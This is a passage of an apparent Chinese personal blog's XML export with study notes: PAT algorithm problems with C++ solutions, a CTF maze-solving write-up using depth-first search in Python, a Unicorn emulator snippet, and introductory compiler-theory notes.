        mu.emu_start(ADDRESS, ADDRESS + len(ARM_CODE))
        r0 = mu.reg_read(UC_ARM_REG_R0)
        r1 = mu.reg_read(UC_ARM_REG_R1)
        print(&quot;&gt;&gt;&gt; R0 = 0x%x&quot; % r0)
        print(&quot;&gt;&gt;&gt; R1 = 0x%x&quot; % r1)
    except UcError as e:
        print(&quot;ERROR: %s&quot; % e)
</code></pre>
<blockquote>
<p>文章引用Pandaos大佬的文章：[<a href="https://bbs.pediy.com/thread-253868.htm#msg_header_h1_1">原创] Unicorn 在 Android 的应用-Android安全-看雪论坛-安全社区|安全招聘|bbs.pediy.com</a></p>
</blockquote>
]]></content>
      <categories>
        <category>re</category>
        <category>前置知识学习</category>
      </categories>
      <tags>
        <tag>unicorn</tag>
      </tags>
  </entry>
  <entry>
    <title>双指针优化</title>
    <url>/2023/05/11/%E5%8F%8C%E6%8C%87%E9%92%88%E4%BC%98%E5%8C%96/</url>
    <content><![CDATA[<p><strong>完美数列</strong></p>
<span id="more"></span>

<h2 id="第一题"><a href="#第一题" class="headerlink" title="第一题"></a>第一题</h2><p>给定一个正整数数列，和正整数 <em>p</em>，设这个数列中的最大值是 <em>M</em>，最小值是 <em>m</em>，如果 <em>M</em>≤<em>m**p</em>，则称这个数列是完美数列。</p>
<p>现在给定参数 <em>p</em> 和一些正整数，请你从中选择尽可能多的数构成一个完美数列。</p>
<h3 id="输入格式："><a href="#输入格式：" class="headerlink" title="输入格式："></a>输入格式：</h3><p>输入第一行给出两个正整数 <em>N</em> 和 <em>p</em>，其中 <em>N</em>（≤105）是输入的正整数的个数，<em>p</em>（≤109）是给定的参数。第二行给出 <em>N</em> 个正整数，每个数不超过 109。</p>
<h3 id="输出格式："><a href="#输出格式：" class="headerlink" title="输出格式："></a>输出格式：</h3><p>在一行中输出最多可以选择多少个数可以用它们组成一个完美数列。</p>
<h3 id="输入样例："><a href="#输入样例：" class="headerlink" title="输入样例："></a>输入样例：</h3><pre><code class="in">10 8
2 3 20 4 5 1 6 7 8 9
</code></pre>
<h3 id="输出样例："><a href="#输出样例：" class="headerlink" title="输出样例："></a>输出样例：</h3><pre><code class="out">8
</code></pre>
<blockquote>
<p>题目分析：原先我的想法是假设最长数列就是n，然后有序数组进行两端判断。想法是有，但是代码不知道怎么写</p>
<p>柳神是用双指针，这题其实双指针的时间复杂度都能上n^2^了，所以这里双指针要优化一下，用res来存放当前最长长度，</p>
<p>第一重循环用i&#x3D;0~n,第二层循环j就不能从0开始了否则太慢了，而且重复了。</p>
<p>第二重循环用j&#x3D;i+res~n</p>
<p>第二重循环中判断到不符合条件就直接跳出了，因为这是个有序数组，之后的数据也都不成立了。</p>
<p>所以做这两个优化后，效率杠杠的👍</p>
</blockquote>
<pre><code class="c++">#include&lt;iostream&gt;
#include&lt;algorithm&gt;
using namespace std;
int main(void)&#123;
    int n;
    long p;
    cin &gt;&gt; n &gt;&gt; p;
    int a[n],i,j;
    for(i = 0; i &lt; n ;i++) cin &gt;&gt; a[i];
    sort(a,a+n);
    int tmp = 0,res = 0;
    for(i = 0; i &lt; n ;i++)&#123;
        for(j=i + res;j &lt; n;j++)  
            if(a[i] * p &gt;= a[j] &amp;&amp; (tmp = j - i + 1) &gt; res)  res = tmp;
            else break;
    &#125;
    cout &lt;&lt; res;
    return 0;
&#125;
</code></pre>
<hr>
<h2 id="归并与插入"><a href="#归并与插入" class="headerlink" title="归并与插入"></a>归并与插入</h2><p><strong>插入排序</strong>是迭代算法，逐一获得输入数据，逐步产生有序的输出序列。每步迭代中，算法从输入序列中取出一元素，将之插入有序序列中正确的位置。如此迭代直到全部元素有序。</p>
<p><strong>归并排序</strong>进行如下迭代操作：首先将原始序列看成 N 个只包含 1 个元素的有序子序列，然后每次迭代归并两个相邻的有序子序列，直到最后只剩下 1 个有序的序列。</p>
<p>现给定原始序列和由某排序算法产生的中间序列，请你判断该算法究竟是哪种排序算法？</p>
<h3 id="输入格式：-1"><a href="#输入格式：-1" class="headerlink" title="输入格式："></a>输入格式：</h3><p>输入在第一行给出正整数 N (≤100)；随后一行给出原始序列的 N 个整数；最后一行给出由某排序算法产生的中间序列。这里假设排序的目标序列是升序。数字间以空格分隔。</p>
<h3 id="输出格式：-1"><a href="#输出格式：-1" class="headerlink" title="输出格式："></a>输出格式：</h3><p>首先在第 1 行中输出<code>Insertion Sort</code>表示插入排序、或<code>Merge Sort</code>表示归并排序；然后在第 2 行中输出用该排序算法再迭代一轮的结果序列。题目保证每组测试的结果是唯一的。数字间以空格分隔，且行首尾不得有多余空格。</p>
<h3 id="输入样例-1："><a href="#输入样例-1：" class="headerlink" title="输入样例 1："></a>输入样例 1：</h3><pre><code class="in">10
3 1 2 8 7 5 9 4 6 0
1 2 3 7 8 5 9 4 6 0
</code></pre>
<h3 id="输出样例-1："><a href="#输出样例-1：" class="headerlink" title="输出样例 1："></a>输出样例 1：</h3><pre><code class="out">Insertion Sort
1 2 3 5 7 8 9 4 6 0
</code></pre>
<h3 id="输入样例-2："><a href="#输入样例-2：" class="headerlink" title="输入样例 2："></a>输入样例 2：</h3><pre><code class="in">10
3 1 2 8 7 5 9 4 0 6
1 3 2 8 5 7 4 9 0 6
</code></pre>
<h3 id="输出样例-2："><a href="#输出样例-2：" class="headerlink" title="输出样例 2："></a>输出样例 2：</h3><pre><code class="out">Merge Sort
1 2 3 8 4 5 7 9 0 6
</code></pre>
<blockquote>
<p>题目分析：</p>
<p>这题由于插入排序是从后往前的，所以插入排序的中间序列一定是，前段有序，后段和原序列相同。</p>
<p>归并排序的话没有直观的规律，这里不是插入就是归并了，极端情况的数据没有意义</p>
<p>这里归并排序的下一个序列，由于无法判断是第几次归并，所以只能用原序列进行一次次归并比较中间序列，直到全部吻合</p>
<p><code>这里值得学习的是，用c++的sort函数，直接忽略了插入排序和归并排序的具体排序细节，运行效率可能没有她两好，不过开发效率很香</code></p>
</blockquote>
<pre><code class="c++">#include&lt;iostream&gt;
#include&lt;algorithm&gt;
using namespace std;
int main(void)&#123;
        int n;
        cin &gt;&gt; n;
        int a[n],b[n],i,j;
        for(i=0;i &lt; n;i++) cin &gt;&gt; a[i];
        for(i=0;i &lt; n;i++) cin &gt;&gt; b[i];
        for(i=0;b[i] &lt;= b[i+1];i++);
        for(j=i + 1;b[j] == a[j] &amp;&amp; j &lt; n;j++);
        if(j == n)&#123;
            cout &lt;&lt; &quot;Insertion Sort&quot; &lt;&lt; endl;
            sort(a,a+i+2);
        &#125;else&#123;
            cout &lt;&lt; &quot;Merge Sort&quot; &lt;&lt; endl;
            int flag = 1 , k = 1;
            while(flag)&#123;
                flag = 0;
                for(i = 0; i &lt; n ; i++) if(a[i] != b[i]) flag = 1;
                k *= 2;
                for(i = 0; i &lt; n / k ; i++) sort(a + i * k, a + (i+1)*k );
                sort(a + n / k * k, a + n); // n / k 不整除的情况下，剩余部分给计算进去 
            &#125;
        &#125;
        for(i=0;i &lt; n;i++) &#123;
            if(i != 0) cout &lt;&lt; &quot; &quot;;
            cout &lt;&lt; a[i];
        &#125;
        return 0;
&#125;
</code></pre>
]]></content>
      <categories>
        <category>PAT练习</category>
      </categories>
  </entry>
  <entry>
    <title>奇奇怪怪的错误</title>
    <url>/2023/05/09/%E5%A5%87%E5%A5%87%E6%80%AA%E6%80%AA%E7%9A%84%E9%94%99%E8%AF%AF/</url>
    <content><![CDATA[<p>PAT乙级第二天记录——反转链表（纯数组解）</p>
<span id="more"></span>

<h2 id="第一题"><a href="#第一题" class="headerlink" title="第一题"></a>第一题</h2><p>给定一个常数 <em>K</em> 以及一个单链表 <em>L</em>，请编写程序将 <em>L</em> 中每 <em>K</em> 个结点反转。例如：给定 <em>L</em> 为 1→2→3→4→5→6，<em>K</em> 为 3，则输出应该为 3→2→1→6→5→4；如果 <em>K</em> 为 4，则输出应该为 4→3→2→1→5→6，即最后不到 <em>K</em> 个元素不反转。</p>
<h3 id="输入格式："><a href="#输入格式：" class="headerlink" title="输入格式："></a>输入格式：</h3><p>每个输入包含 1 个测试用例。每个测试用例第 1 行给出第 1 个结点的地址、结点总个数正整数 <em>N</em> (≤105)、以及正整数 <em>K</em> (≤<em>N</em>)，即要求反转的子链结点的个数。结点的地址是 5 位非负整数，NULL 地址用 −1 表示。</p>
<p>接下来有 <em>N</em> 行，每行格式为：</p>
<pre><code>Address Data Next
</code></pre>
<p>其中 <code>Address</code> 是结点地址，<code>Data</code> 是该结点保存的整数数据，<code>Next</code> 是下一结点的地址。</p>
<h3 id="输出格式："><a href="#输出格式：" class="headerlink" title="输出格式："></a>输出格式：</h3><p>对每个测试用例，顺序输出反转后的链表，其上每个结点占一行，格式与输入相同。</p>
<h3 id="输入样例："><a href="#输入样例：" class="headerlink" title="输入样例："></a>输入样例：</h3><pre><code class="in">00100 6 4
00000 4 99999
00100 1 12309
68237 6 -1
33218 3 00000
99999 5 68237
12309 2 33218
</code></pre>
<h3 id="输出样例："><a href="#输出样例：" class="headerlink" title="输出样例："></a>输出样例：</h3><pre><code class="out">00000 4 33218
33218 3 12309
12309 2 00100
00100 1 99999
99999 5 68237
68237 6 -1
</code></pre>
<p>奇奇怪怪的错误</p>
<p><img src="/./../images/image-20230509104121801.png" alt="image-20230509104121801"></p>
<p>后面发现是我main函数return 1</p>
<p>搜了网友的回答：shell返回值非0是程序退出异常，说明你的代码抛出了异常。</p>
<p>soga！！！</p>
<blockquote>
<p>首先这题并没有用到链表结构而是用几个容量大的数组把数据存起来，存起来之后再用一个数组把节点地址线性存起来，节点下一个地址就是下一个位置的值，太妙了😁！！！反转的话直接在地址上反转就行丝毫不影响数据之间的变化。</p>
</blockquote>
<p>原本我的代码：</p>
<pre><code class="c++">#include&lt;iostream&gt;
#include&lt;algorithm&gt; 
using namespace std;
int main(void)&#123;
    int first,N,K,tmp;
    int next[100000],data[100000],list[100000];
    cin &gt;&gt; first &gt;&gt; N &gt;&gt; K;
    for(int i=0;i&lt;N;i++)&#123;
        cin &gt;&gt; tmp;
        cin &gt;&gt; data[tmp] &gt;&gt; next[tmp];
    &#125;
    int sum = 0; // 不是所有节点都在链上 
    //用list数组构造链表
    for(int i=0;first != -1;i++)&#123;
        list[sum++] = first;
        first = next[first];
    &#125;
    //反转链表
    for(int i=0;i&lt;sum-i*K;i+=K)&#123;
        reverse(begin(list)+i,begin(list)+i+K);
    &#125;
    for(int i=0;i&lt;sum-1;i++)&#123;
        printf(&quot;%05d %d %05d\n&quot;,list[i],data[list[i]],list[i+1]);
    &#125;
    printf(&quot;%05d %d -1&quot;,list[sum-1],data[list[sum-1]]);
    return 0;
&#125; 
</code></pre>
<p>这里的错误主要是<strong>【i&lt;sum-i*K】</strong>。</p>
<p>我真是脑残，i的值是会变的呀，只能说我写的时候思维好不严谨😢</p>
<p>修改后：</p>
<pre><code class="c++">#include&lt;iostream&gt;
#include&lt;algorithm&gt; 
using namespace std;
int main(void)&#123;
    int first,N,K,tmp;
    int next[100000],data[100000],list[100000];
    cin &gt;&gt; first &gt;&gt; N &gt;&gt; K;
    for(int i=0;i&lt;N;i++)&#123;
        cin &gt;&gt; tmp;
        cin &gt;&gt; data[tmp] &gt;&gt; next[tmp];
    &#125;
    int sum = 0; // 不是所有节点都在链上 
    //用list数组构造链表
    for(int i=0;first != -1;i++)&#123;
        list[sum++] = first;
        first = next[first];
    &#125;
    //反转链表
    for(int i=0;i&lt;=sum - sum % K;i+=K)&#123;
        reverse(begin(list)+i,begin(list)+i+K);
    &#125;
    for(int i=0;i&lt;sum-1;i++)&#123;
        printf(&quot;%05d %d %05d\n&quot;,list[i],data[list[i]],list[i+1]);
    &#125;
    printf(&quot;%05d %d -1&quot;,list[sum-1],data[list[sum-1]]);
    return 1;
&#125; 
</code></pre>
<hr>
<h2 id="第二题"><a href="#第二题" class="headerlink" title="第二题"></a>第二题</h2><p>让我们定义<em>d<del>n</del><em>为：</em>d<del>n</del></em>&#x3D;<em>p<del>n+1</del>−</em>p<del>n</del><em>，其中</em>p*<del>i</del><em>是第</em>i<em>个素数。显然有</em>d*<del>1</del>&#x3D;1，且对于<em>n</em>&gt;1有*d<del>n</del>*是偶数。“素数对猜想”认为“存在无穷多对相邻且差为2的素数。</p>
<p>现给定任意正整数<code>N</code>(&lt;105)，请计算不超过<code>N</code>的满足猜想的素数对的个数。</p>
<h3 id="输入格式"><a href="#输入格式" class="headerlink" title="输入格式:"></a>输入格式:</h3><p>输入在一行给出正整数<code>N</code>。</p>
<h3 id="输出格式"><a href="#输出格式" class="headerlink" title="输出格式:"></a>输出格式:</h3><p>在一行中输出不超过<code>N</code>的满足猜想的<code>素数对的个数</code>。</p>
<h3 id="输入样例"><a href="#输入样例" class="headerlink" title="输入样例:"></a>输入样例:</h3><pre><code class="in">20
</code></pre>
<h3 id="输出样例"><a href="#输出样例" class="headerlink" title="输出样例:"></a>输出样例:</h3><pre><code class="out">4
</code></pre>
<blockquote>
<p>这题显然是素数问题，写个判断素数就行，差为2的话少于5的都是0个，大于5才有素数对；</p>
<p>这里柳神判断素数是<code>i * i &lt;= n</code>,这样都不用考虑用开平方的函数了</p>
</blockquote>
<p><strong>代码：</strong></p>
<pre><code class="c++">#include&lt;iostream&gt;
using namespace std;
int isprime(int n)&#123;
    for(int i=2;i * i &lt;= n;i++)&#123;
        if(n % i == 0)&#123;
            return 0;
        &#125;
    &#125;
    return 1;
&#125;
int main(void)&#123;
    int n,cnt = 0;
    cin &gt;&gt; n;
    for(int i=5;i&lt;=n;i+=2)&#123;
        if(isprime(i) &amp;&amp; isprime(i-2)) cnt++;
        
    &#125;
    cout &lt;&lt; cnt;
&#125;
</code></pre>
<hr>
<h2 id="第二题-1"><a href="#第二题-1" class="headerlink" title="第二题"></a>第二题</h2><p>On a broken keyboard, some of the keys are worn out. So when you type some sentences, the characters corresponding to those keys will not appear on screen.</p>
<p>Now given a string that you are supposed to type, and the string that you actually type out, please list those keys which are for sure worn out.</p>
<h3 id="Input-Specification"><a href="#Input-Specification" class="headerlink" title="Input Specification:"></a>Input Specification:</h3><p>Each input file contains one test case. For each case, the 1st line contains the original string, and the 2nd line contains the typed-out string. Each string contains no more than 80 characters which are either English letters [A-Z] (case insensitive), digital numbers [0-9], or <code>_</code> (representing the space). It is guaranteed that both strings are non-empty.</p>
<h3 id="Output-Specification"><a href="#Output-Specification" class="headerlink" title="Output Specification:"></a>Output Specification:</h3><p>For each test case, print in one line the keys that are worn out, in the order of being detected. The English letters must be capitalized. Each worn out key must be printed once only. It is guaranteed that there is at least one worn out key.</p>
<h3 id="Sample-Input"><a href="#Sample-Input" class="headerlink" title="Sample Input:"></a>Sample Input:</h3><pre><code class="in">7_This_is_a_test
_hs_s_a_es
</code></pre>
<h3 id="Sample-Output"><a href="#Sample-Output" class="headerlink" title="Sample Output:"></a>Sample Output:</h3><pre><code class="out">7TI
</code></pre>
<blockquote>
<p>这是一道甲级题，但是非常简单，题目大意就是找不完整的字母，然后用大写字母输出，但是每个大写字母只输出一次。</p>
<p>用c++中string的find函数即可，<code>string::npos</code>是没有找到的意思。</p>
</blockquote>
<pre><code class="c++">#include&lt;iostream&gt;
#include&lt;cctype&gt;
using namespace std;
int main(void)&#123;
    string s1,s2,ans;
    cin &gt;&gt; s1 &gt;&gt; s2;
    for(int i=0;i&lt;s1.length();i++)&#123;
        if(s2.find(s1[i]) == string::npos &amp;&amp; ans.find(toupper(s1[i])) == string::npos)&#123;
            ans += toupper(s1[i]);
        &#125;
    &#125;
    cout &lt;&lt; ans;
    return 0;
&#125;
</code></pre>
]]></content>
      <categories>
        <category>PAT练习</category>
      </categories>
  </entry>
  <entry>
    <title>安徽省赛</title>
    <url>/2022/11/21/%E5%AE%89%E5%BE%BD%E7%9C%81%E8%B5%9B/</url>
    <content><![CDATA[<p>安徽省赛只有一个小时，我吐了，脚本都来不及写。。。。赛后才把flag搞出来</p>
<span id="more"></span>

<p>呃，</p>
<p>我其实也是第一次见这么庞大的迷宫，一共4384个格~~</p>
<p>这里看见一行66</p>
<p><a href="https://imgse.com/i/zQvXfe"><img src="https://s1.ax1x.com/2022/11/21/zQvXfe.png" alt="zQvXfe.png"></a></p>
<p>代码逻辑很简单，这里不做过多介绍</p>
<p><em>&#x2F;我原先的脚本的思路是走到错的地方再返回，导致效率太低，跑了好久都没跑出来&#x2F;</em></p>
<p>赛后我还未想好该怎么优化我的深搜算法，所以就进行了一波手工画图。。。。。。。。</p>
<h4 id="图一："><a href="#图一：" class="headerlink" title="图一："></a>图一：</h4><p><a href="https://imgse.com/i/zQvwWQ"><img src="https://s1.ax1x.com/2022/11/21/zQvwWQ.png" alt="zQvwWQ.png"></a></p>
<h4 id="图二："><a href="#图二：" class="headerlink" title="图二："></a>图二：</h4><p><a href="https://imgse.com/i/zQv7ex"><img src="https://s1.ax1x.com/2022/11/21/zQv7ex.png" alt="zQv7ex.png"></a></p>
<h4 id="图三："><a href="#图三：" class="headerlink" title="图三："></a>图三：</h4><p><a href="https://imgse.com/i/zQvHw6"><img src="https://s1.ax1x.com/2022/11/21/zQvHw6.png" alt="zQvHw6.png"></a></p>
<p>emmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmm</p>
<p>然后就根据这个路线，手写路线字符串</p>
<p><a href="https://imgse.com/i/zQx9mt"><img src="https://s1.ax1x.com/2022/11/21/zQx9mt.png" alt="zQx9mt.png"></a></p>
<p>以上是我写的，本办法，太菜了，只能这么搞了</p>
<hr>
<p>##下面贴上EDI团队的脚本</p>
<pre><code class="python">
map = []
data =[map[i*66:i*66+66] for i in range(66)]
print(data)
usedmap  =  [[0 for i in range(len(data))] for i in range(len(data)) ]
flag=&quot;&quot;

def DFS(x,y):
    global flag
    if x == 64 and y == 65:
        print(flag)
    if data[x+1][y] == 0 and usedmap [x+1][y] == 0:
        usedmap [x][y] = 1
        flag += &#39;s&#39;
        DFS(x+1,y)
        flag = flag[:-1]
        usedmap [x][y] = 0
    if data[x-1][y] == 0 and usedmap [x-1][y] == 0:
        usedmap [x][y] = 1
        flag += &#39;w&#39;
        DFS(x-1,y)
        flag = flag[:-1]
        usedmap [x][y] = 0
    if data[x][y+1] == 0 and usedmap [x][y+1] == 0:
        usedmap [x][y] = 1
        flag += &#39;d&#39;
        DFS(x,y+1)
        flag = flag[:-1]
        usedmap [x][y] = 0
    if data[x][y-1] == 0 and usedmap [x][y-1] == 0:
        usedmap [x][y] = 1
        flag += &#39;a&#39;
        DFS(x,y-1)
        flag = flag[:-1]
        usedmap [x][y] = 0
y=0
x=1
try:
    DFS(x,y)
except:
    pass
</code></pre>
<p>他们的脚本其实就是只走对的位置，我实在没想到居然效率会快这么多！！！！！！！！！</p>
<p>后来我参照他们的思路，重新优化了一下我的脚本，可以说在他们的基础上在一次优化了程序的效率</p>
<p><strong>只能说算法实在太重要了！！！！！！！！！！！！！！</strong></p>
<h2 id="我的代码："><a href="#我的代码：" class="headerlink" title="我的代码："></a>我的代码：</h2><pre><code class="python">def dfs(v6, v7):
    global flag
    if len(flag) &gt; 364: # 这里防止深度过深
        return
    if v6 == 64 and v7 == 65:
        print(flag)
    tlag[66 * v6 + v7] = 1  # 标记走过了
    if map1[66 * v6 + v7 + 1] == 0 and tlag[66 * v6 + v7+1] == 0: # 这个位置能不能走，有没有走过
        flag += &#39;d&#39;
        dfs(v6, v7 + 1)
        flag = flag[:-1]
    if map1[66 * (v6+1) + v7] == 0 and tlag[66 * (v6+1) + v7] == 0:
        flag += &#39;s&#39;
        dfs(v6+1,v7)
        flag = flag[:-1]
    if map1[66 * (v6-1) + v7] == 0 and tlag[66 * (v6-1) + v7] == 0:
        flag += &#39;w&#39;
        dfs(v6-1, v7)
        flag = flag[:-1]
    if map1[66 * (v6) + v7 - 1] == 0 and tlag[66 * (v6) + v7-1] == 0:
        flag += &#39;a&#39;
        dfs(v6, v7 - 1)
        flag = flag[:-1]
    # 这里不用将标志去掉，因为这个位置所有方向都走过了都没到终点，那么其他位置到达该位置也无法到达终点，所以懂吧？
if __name__ == &quot;__main__&quot;:
    map1 = []
    tlag = [0]*len(map1)
    flag = &quot;&quot;
    try:
        dfs(1, 0)
    except:
        pass
</code></pre>
<p>至于代码的细节这里直接看注释即可，都已经写好了</p>
<h1 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h1><p>这里个人的算法功底还有待提升，算法还是要多练，不然明明会做，但是现场做不出来，太难受了！！！</p>
]]></content>
      <categories>
        <category>ctf</category>
        <category>赛题复现wp</category>
      </categories>
  </entry>
  <entry>
    <title>机器学习_李宏毅(1)</title>
    <url>/2024/06/25/%E6%9C%BA%E5%99%A8%E5%AD%A6%E4%B9%A0-%E6%9D%8E%E5%AE%8F%E6%AF%85-1/</url>
    <content><![CDATA[<p> 李宏毅的课超棒</p>
<span id="more"></span>

]]></content>
      <categories>
        <category>AI</category>
        <category>机器学习</category>
      </categories>
      <tags>
        <tag>李宏毅</tag>
      </tags>
  </entry>
  <entry>
    <title>有理数四则运算</title>
    <url>/2023/05/16/%E6%9C%89%E7%90%86%E6%95%B0%E5%9B%9B%E5%88%99%E8%BF%90%E7%AE%97/</url>
    <content><![CDATA[<p>诸多细节一不小心就写烂了</p>
<span id="more"></span>

<h2 id="题目："><a href="#题目：" class="headerlink" title="题目："></a>题目：</h2><p>本题要求编写程序，计算 2 个有理数的和、差、积、商。</p>
<h3 id="输入格式："><a href="#输入格式：" class="headerlink" title="输入格式："></a>输入格式：</h3><p>输入在一行中按照 <code>a1/b1 a2/b2</code> 的格式给出两个分数形式的有理数，其中分子和分母全是整型范围内的整数，负号只可能出现在分子前，分母不为 0。</p>
<h3 id="输出格式："><a href="#输出格式：" class="headerlink" title="输出格式："></a>输出格式：</h3><p>分别在 4 行中按照 <code>有理数1 运算符 有理数2 = 结果</code> 的格式顺序输出 2 个有理数的和、差、积、商。注意输出的每个有理数必须是该有理数的最简形式 <code>k a/b</code>，其中 <code>k</code> 是整数部分，<code>a/b</code> 是最简分数部分；若为负数，则须加括号；若除法分母为 0，则输出 <code>Inf</code>。题目保证正确的输出中没有超过整型范围的整数。</p>
<h3 id="输入样例-1："><a href="#输入样例-1：" class="headerlink" title="输入样例 1："></a>输入样例 1：</h3><pre><code class="in">2/3 -4/2
</code></pre>
<h3 id="输出样例-1："><a href="#输出样例-1：" class="headerlink" title="输出样例 1："></a>输出样例 1：</h3><pre><code class="out">2/3 + (-2) = (-1 1/3)
2/3 - (-2) = 2 2/3
2/3 * (-2) = (-1 1/3)
2/3 / (-2) = (-1/3)
</code></pre>
<h3 id="输入样例-2："><a href="#输入样例-2：" class="headerlink" title="输入样例 2："></a>输入样例 2：</h3><pre><code class="in">5/3 0/6
</code></pre>
<h3 id="输出样例-2："><a href="#输出样例-2：" class="headerlink" title="输出样例 2："></a>输出样例 2：</h3><pre><code class="out">1 2/3 + 0 = 1 2/3
1 2/3 - 0 = 1 2/3
1 2/3 * 0 = 0
1 2/3 / 0 = Inf
</code></pre>
<p>原先求最小公倍数代码：</p>
<pre><code class="c++">while(m != n)&#123;	//创立两个变量来求最小公约数 
    if(m &gt; n) m -= n;
    else n -= m;
&#125;
</code></pre>
<p>运行超时：</p>
<p><img src="/./../images/image-20230516170613514.png" alt="image-20230516170613514"></p>
<p><code>超时的原因可能是一个变量很大，一个变量很小，循环的次数太多了</code></p>
<p>大佬的代码：</p>
<pre><code class="c++">int gcd(int t1, int t2) &#123;
    return t2 == 0 ? t1 : gcd(t2, t1 % t2);
&#125;
</code></pre>
<p>辗转相除法递归写法</p>
<p>c++中库函数__gcd()求最小公倍数：要包含头文件#include<algorithm></algorithm></p>
<p>不超时答案错误：</p>
<p><img src="/./../images/image-20230516191023762.png" alt="image-20230516191023762"></p>
<blockquote>
<p>柳神分析：</p>
<p><strong>func(m, n)的作用是对m&#x2F;n的分数进行化简，gcd(t1, t2)的作用是计算t1和t2的最大公约数～在func函数中，先看m和n里面是否有0（即m*n是否等于0），如果分母n&#x3D;0，输出Inf，如果分子m&#x3D;0，输出”0″～flag表示m和n是否异号，flag&#x3D;true表示后面要添加负号”(-“和括号”)”，再将m和n都转为abs(m)和abs(n)，即取他们的正数部分方便计算～x &#x3D; m&#x2F;n为m和n的可提取的整数部分，先根据flag的结果判断是否要在前面追加”(-“，然后根据x是否等于0判断要不要输出这个整数位，接着根据m%n是否等于0的结果判断后面还有没有小分数，如果m能被n整除，表示没有后面的小分数，那么就根据flag的结果判断要不要加”)”，然后直接return～如果有整数位，且后面有小分数，则要先输出一个空格，接着处理剩下的小分数，先把m分子减去已经提取出的整数部分，然后求m和n的最大公约数t，让m和n都除以t进行化简～最后输出“m&#x2F;n”，如果flag&#x3D;&#x3D;true还要在末尾输出”)”</strong></p>
<p><strong>判断m和n是否异号千万不要写成判断m*n是否小于0，因为m*n的结果可能超过了long long int的长度，导致溢出大于0，如果这样写的话会有一个测试点无法通过</strong>（语言本身的问题，python不存在的）</p>
</blockquote>
<p>正确代码：</p>
<pre><code class="c++">#include &lt;iostream&gt;
#include &lt;cmath&gt;
#include &lt;string&gt;
using namespace std;
long long gcd(long long a, long long b)&#123;
    return (b != 0) ? gcd(b,a%b) : a;
&#125;
string func(long long a,long long b)&#123;
    if(!a || !b) return b == 0 ? &quot;Inf&quot; : &quot;0&quot;; // 分子分母有一个是0的情况 
    string res = ((a &gt; 0 &amp;&amp; b &lt; 0) || (a &lt; 0 &amp;&amp; b &gt; 0)) ? &quot;(-&quot; : &quot;&quot;; // 判断正负
    a = abs(a);b = abs(b); 
    long long x = a/b;
    res += (x != 0) ? to_string(x) : &quot;&quot;; //整数部分
    if(a % b == 0)&#123;
        if(res[0] == &#39;(&#39;) return res+&quot;)&quot;;
        return res;
    &#125; 
    else if(x != 0) res += &quot; &quot;;
    a = a - b * x;
    long long n = gcd(a,b);
    a /= n;b /= n;
    res += to_string(a) + &quot;/&quot; + to_string(b);
    if(res[0] == &#39;(&#39;) return res + &quot;)&quot;;
    return res;
&#125;
int main(void)&#123;
    long long  f1,f2,m1,m2;
    scanf(&quot;%lld/%lld %lld/%lld&quot;,&amp;f1,&amp;m1,&amp;f2,&amp;m2);
    string str1 = func(f1,m1),str2 = func(f2,m2);
    cout &lt;&lt; str1 &lt;&lt; &quot; + &quot; &lt;&lt; str2 &lt;&lt; &quot; = &quot; &lt;&lt; func(f1*m2+f2*m1,m1*m2) &lt;&lt; endl;
    cout &lt;&lt; str1 &lt;&lt; &quot; - &quot; &lt;&lt; str2 &lt;&lt; &quot; = &quot; &lt;&lt; func(f1*m2-f2*m1,m1*m2) &lt;&lt; endl;
    cout &lt;&lt; str1 &lt;&lt; &quot; * &quot; &lt;&lt; str2 &lt;&lt; &quot; = &quot; &lt;&lt; func(f1*f2,m1*m2) &lt;&lt; endl;
    cout &lt;&lt; str1 &lt;&lt; &quot; / &quot; &lt;&lt; str2 &lt;&lt; &quot; = &quot; &lt;&lt; func(f1*m2,f2*m1);
&#125;
</code></pre>
<p>其实就是要把所有变量都给成long long类型，题目说好在整型范围内，气死我了😒</p>
<p>然后这题我原本的想法是把四则运算全部合到一起，但是太混乱了。柳神这样把分数表示单独弄成一个函数，把运算全部改成简单数学运算，所有的细节都合成一个函数中，太妙了！！好绝👍</p>
]]></content>
      <categories>
        <category>PAT练习</category>
      </categories>
  </entry>
  <entry>
    <title>编译篇1</title>
    <url>/2023/01/09/%E7%BC%96%E8%AF%91%E7%AF%871/</url>
    <content><![CDATA[<p>引论学习</p>
<span id="more"></span>

<h3 id="程序设计语言的转换"><a href="#程序设计语言的转换" class="headerlink" title="程序设计语言的转换"></a>程序设计语言的转换</h3><ul>
<li>编译：从高级语言到低级语言的过程</li>
<li>解释：接受高级语言的一条语句输入，进行解释并控制计算机执行，马上获得该语句的执行结果，然后接受下一条语句<ul>
<li>优点：实现人机交互</li>
<li>缺点：效率差，每次都要解释，而不像编译一样，只需编译一次，以后只需执行即可</li>
</ul>
</li>
<li>编译的转换过程：<ul>
<li>两阶段转换：编译一一执行<img src="/./../images/image-20230109130459860.png" alt="image-20230109130459860"></li>
<li>三个阶段的转换：编译一一汇编一一运行<img src="/./../images/image-20230109131018804.png" alt="image-20230109131018804"></li>
</ul>
</li>
</ul>
<h3 id="编译程序概述"><a href="#编译程序概述" class="headerlink" title="编译程序概述"></a>编译程序概述</h3><p>自然语言的翻译：</p>
<ol>
<li>识别句子中一个个单词</li>
<li>分析句子的语法结构</li>
<li>根据句子的含义进行初步翻译</li>
<li>对译文进行修饰</li>
<li>写出最后译文</li>
</ol>
<p>编译程序的工作：</p>
<ul>
<li>词法分析</li>
<li>语法分析</li>
<li>语义分析和中间代码的生成</li>
<li>优化</li>
<li>目标代码的生成</li>
</ul>
<p><img src="/./../images/image-20230109173201830.png" alt="image-20230109173201830"></p>
<p>词法分析：</p>
<ul>
<li>任务：对源程序的字符串进行扫描和分解，识别出一个个单词</li>
<li>基本字：void,int,float</li>
<li>标识符：a,b,c,d</li>
<li>长整数：50</li>
<li>运算符：+，-，*，&#x3D;</li>
<li>界限符：{}，；（）</li>
<li>词法分析依照词法规则，识别出正确的单词，转换成统一规格，备用</li>
<li>转换：<ul>
<li>对基本字、运算符、界限符的转换</li>
<li>标识符的转换</li>
<li>常数的转换</li>
<li>转换完成的格式（类号、内码）</li>
</ul>
</li>
<li>描述词法规则的有效工具是正规式和有限自动机</li>
</ul>
<p>语法分析：</p>
<ul>
<li>任务：词法分析后的单词，根据语言的语法规则，把单词符号组成各类语法单位：子句、语句</li>
<li>语法规则：规定单词如何组成句，称为文法</li>
<li>语法规则的表示：<ul>
<li>BNF:	A::&#x3D;B|C	表示A定义为B或C</li>
</ul>
</li>
<li>语法分析的方法：<strong>推导</strong>和<strong>规约</strong></li>
<li>推导：最左推导和最右推导</li>
